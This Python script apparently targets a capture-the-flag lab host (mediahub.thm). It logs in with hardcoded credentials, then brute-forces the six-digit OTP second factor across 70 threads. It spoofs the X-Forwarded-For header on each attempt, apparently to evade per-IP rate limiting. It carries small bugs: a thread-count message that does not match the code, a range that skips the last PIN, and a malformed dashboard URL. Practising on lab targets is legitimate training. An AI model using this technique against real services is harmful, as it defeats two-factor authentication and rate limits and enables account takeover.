import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

ip='10.113.168.223'
email = 'admin@mediahub.thm'
password = 'MediaHub2026'
url = f"http://{ip}/api_login.php"
otp_url = f"http://{ip}/verify_otp.php"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"http://{ip}",
}

found = False
found_pin = None
session = None

def try_pin(pin, session, headers):
    """Проверяет один PIN-код"""
    global found, found_pin

    if found:
        return None

    pin_str = str(pin).zfill(6)

    headers['X-Forwarded-For'] = pin_str

    data = {"otp": pin_str}

    try:
        response = session.post(otp_url, headers=headers, data=data, timeout=3)
        print('pin:',pin_str,'forwarded:',pin_str)

        if "Invalid OTP" not in response.text:
            found = True
            found_pin = pin_str
            return pin_str, response.text, session.cookies.get_dict()

        return None

    except Exception as e:
        return None

def brute_force_pin(session):
    global found, found_pin

    print("[*] Starting PIN bruteforce with 20 threads...")

    with ThreadPoolExecutor(max_workers=70) as executor:
        # Создаём задачи для всех PIN-кодов от 0 до 999999
        futures = [executor.submit(try_pin, pin, session, headers.copy()) for pin in range(0, 999999)]

        for future in as_completed(futures):
            result = future.result()
            if result:
                pin, resp, cookies = result
                print(f"[+] PIN FOUND: {pin}")
                print(f"[+] Response: {resp}")
                print(f"[+] Cookies: {cookies}")
                return pin, session, resp

    return None

def login():
    global session
    session = requests.Session()
    data = {"email": email, "password": password}
    response = session.post(url, data=data, headers=headers)

    if "success" in response.text.lower():
        print("✅ Login successful!")
        print(f"Response: {response.text}")
        print(f"Cookies: {session.cookies.get_dict()}")

        result = brute_force_pin(session)
        if result:
            pin, session, otp_response = result
            print("\n✅ Full session saved!")
            print(f"PIN: {pin}")
            print(f"Session cookies: {session.cookies.get_dict()}")
            return session
    else:
        print("❌ Login failed")
        print(response.text)
        return None

if __name__ == "__main__":
    session = login()

    if session:
        dashboard_resp = session.get(f"http:/{ip}/dashboard.php")
        print(f"Dashboard status: {dashboard_resp.status_code}")